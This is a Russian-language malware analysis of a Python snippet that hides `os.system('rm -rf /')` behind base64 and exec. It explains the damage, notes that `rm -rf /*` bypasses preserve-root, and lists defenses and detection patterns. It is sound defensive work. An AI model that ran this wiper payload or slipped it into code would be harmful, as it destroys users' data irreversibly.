# Деобфускация: анализ скрипта с `exec(base64...)`

## 1. Исследуемый код

```python
a = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
import base64
b = base64.b64decode(a).decode('utf-8')
exec(b)
```

## 2. Расшифрованная строка

Декодирование выполнено **без запуска** (только `base64.b64decode(...).decode('utf-8')`, без `exec`):

```python
import os; os.system('rm -rf /')
```

## 3. Описание угрозы

### Что делает скрипт

1. Строка `a` хранит Base64-представление вредоносной полезной нагрузки, поэтому при беглом просмотре или поиске по ключевым словам (`rm`, `os.system`) её не видно.
2. `base64.b64decode(a).decode('utf-8')` восстанавливает исходный текст в переменную `b`.
3. `exec(b)` выполняет этот текст как Python-код: импортирует модуль `os` и вызывает `os.system('rm -rf /')`.

### Системная команда `rm -rf /`

- `rm` — удаление файлов;
- `-r` (recursive) — рекурсивно, включая все вложенные каталоги;
- `-f` (force) — без запросов подтверждения и без сообщений об ошибках для отсутствующих файлов;
- `/` — корень файловой системы.

### Последствия

- **Необратимое уничтожение данных**: удаляются все файлы, до которых у процесса есть права на запись: пользовательские данные, исходный код, конфигурации, базы данных, журналы, резервные копии на смонтированных дисках и сетевых ресурсах.
- **Права процесса определяют масштаб.** От root уничтожается вся система (ОС перестаёт загружаться, сервисы останавливаются). От обычного пользователя теряется как минимум его домашний каталог и всё остальное, что ему доступно на запись.
- **Современные версии GNU `rm` по умолчанию защищены** (`--preserve-root` отказывается удалять `/` без `--no-preserve-root`), но это не гарантия: в других реализациях (BusyBox, старые системы, контейнеры) защиты может не быть, а вариант `rm -rf /*` обходит её полностью. Полагаться на это нельзя.
- **Отказ в обслуживании** (потеря доступности сервера) и **потеря целостности и доступности данных**. Классификация: выполнение произвольного кода (CWE-94/CWE-95), внедрение команд ОС (CWE-78), вредоносный код (CWE-506, «логическая бомба»/wiper).
- **Скрытность**: запутывание через Base64 не даёт реальной защиты, но обходит простые проверки (grep по подозрительным командам, визуальное ревью). Нагрузка легко заменяется на любую другую: кража ключей, обратная оболочка, шифровальщик.

## 4. Методы защиты

### 4.1. На уровне кода

- **Не использовать `exec`/`eval`/`compile` на данных, которые не контролируются автором.** Если нужна динамика, применять явные безопасные механизмы: словарь допустимых функций (диспетчеризация), `ast.literal_eval` для литералов, `json`/`yaml.safe_load` для данных.
- **Не использовать `os.system` и `shell=True`**. Вместо этого `subprocess.run([...], shell=False)` со списком аргументов и белым списком команд.
- **Валидация входных данных**: любые данные извне (файлы, сеть, переменные окружения) считаются недоверенными; проверка по строгой схеме и белому списку, а не по чёрному.

### 4.2. Статический анализ и ревью

- **Статические анализаторы безопасности**: Bandit (`B102` — `exec`, `B307` — `eval`, `B605`/`B602` — запуск процессов), Semgrep, CodeQL, SonarQube. Их можно запускать в CI/CD (pre-commit, pull request) и блокировать слияние при срабатывании.
- **Правила на цепочку «decode → exec»**: паттерны `exec(base64.b64decode(...))`, `eval(codecs.decode(...))`, `marshal.loads`, `pickle.loads` — сильные признаки обфускации.
- **Обязательное code review** с вниманием к закодированным строкам, неоправданной обфускации и зависимостям (supply-chain-атаки через сторонние пакеты).
- **Динамическое декодирование «в песочнице»**: при анализе подозрительного кода сначала только декодировать строку (как сделано выше), но не исполнять.

### 4.3. На уровне среды выполнения (defense in depth)

- **Принцип наименьших привилегий**: приложение запускается от непривилегированного пользователя; каталоги с данными доступны только на чтение, где запись не нужна.
- **Изоляция**: контейнеры с `read-only` корневой ФС, seccomp/AppArmor/SELinux, запрет запуска процессов (`no-new-privileges`), отдельные ограниченные учётные записи для CI.
- **Резервное копирование** по правилу 3-2-1 с офлайн-копиями или неизменяемыми (immutable) хранилищами, чтобы деструктивный код не мог стереть и бэкапы.
- **Контроль зависимостей и подписей**: фиксация версий (lock-файлы), проверка хешей, SCA-сканеры (pip-audit, Dependabot), установка только из доверенных источников.
- **Мониторинг и аудит**: EDR/auditd, оповещения о массовом удалении файлов и неожиданном запуске `rm`, `sh`, `curl` из интерпретатора Python.
